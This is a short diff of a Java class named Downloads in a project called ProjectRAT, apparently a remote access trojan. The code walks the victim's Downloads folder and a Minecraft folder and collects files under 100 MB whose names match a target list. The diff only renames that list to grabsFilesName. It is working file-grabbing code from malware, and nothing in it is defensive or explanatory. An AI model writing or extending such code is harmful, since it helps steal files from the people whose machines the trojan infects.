@@ -22,7 +22,7 @@ public class Downloads implements Request {
                 if (downloadsDir.exists() && downloadsDir.isDirectory()) {
                     for (File file : downloadsDir.listFiles()){
                         String name = file.getName().toLowerCase();
-                        for(String fileName: ProjectRAT.jarNames) {
+                        for(String fileName: ProjectRAT.grabsFilesName) {
                             if(name.contains(fileName) && file.length() < 104857600 && !file.isDirectory()) {
                                 matches.add(file);
                             }
@@ -32,7 +32,7 @@ public class Downloads implements Request {
                 if(mcFolder.exists() && mcFolder.isDirectory()) {
                     for (File file : mcFolder.listFiles()){
                         String name = file.getName().toLowerCase();
-                        for(String fileName: ProjectRAT.jarNames) {
+                        for(String fileName: ProjectRAT.grabsFilesName) {
                             if(name.contains(fileName) && file.length() < 104857600) {
                                 matches.add(file);
                             }
